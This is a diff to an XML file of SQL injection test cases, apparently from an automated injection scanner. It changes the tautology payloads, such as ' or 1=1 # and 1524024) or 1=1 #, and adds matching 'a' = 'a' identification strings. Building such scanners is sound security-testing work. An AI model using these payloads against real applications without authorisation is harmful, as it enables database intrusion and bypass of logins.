@@ -42,13 +42,13 @@
             <check>NULL</check>
         </case>
         <case id="5">
-            <inject>2 and 1=1 #</inject>
+            <inject>1524024 and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="6">
-            <inject>2) and 1=1 #</inject>
+            <inject>1524024) and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
@@ -56,37 +56,37 @@
         <case id="7">
             <inject>' or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>' or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="8">
             <inject>" or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>" or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="9">
             <inject>') or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>') or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="10">
             <inject>") or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>") or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="11">
-            <inject>2 or 1=1 #</inject>
+            <inject>1524024 or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>1816807 or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="12">
-            <inject>2) or 1=1 #</inject>
+            <inject>1524024) or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>NULL</identify>
+            <identify>1816807) or 'a' = 'a' #</identify>
             <check>NULL</check>
         </case>
         <case id="13">
